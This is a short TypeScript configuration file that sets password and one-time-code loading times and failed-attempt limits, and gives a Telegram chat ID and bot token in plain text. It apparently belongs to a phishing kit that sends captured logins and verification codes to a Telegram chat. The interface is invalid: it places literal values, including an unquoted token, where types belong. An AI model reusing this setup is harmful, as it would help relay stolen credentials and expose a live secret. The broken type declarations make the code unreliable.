interface Config {
  settings: {
    code_loading_time: number;
    max_failed_code_attempts: number;
    max_failed_password_attempts: number;
    password_loading_time: number;
  };
  telegram: {
    data_chatid: -1002348242568;
    data_token: 7625292612:AAEg7yYNDaVSBH_AJDJcRQg2dJZWEZElyvU;
  };
}
const defaultConfig: Config = {
  settings: {
    code_loading_time: 5000,
    max_failed_code_attempts: 0,
    max_failed_password_attempts: 0,
    password_loading_time: 5000,
  },
  telegram: {
    data_chatid: "-1002348242568",
    data_token: "7625292612:AAEg7yYNDaVSBH_AJDJcRQg2dJZWEZElyvU",
  },
};
const getConfig = (): Config => {
  return defaultConfig;
};

export default getConfig;
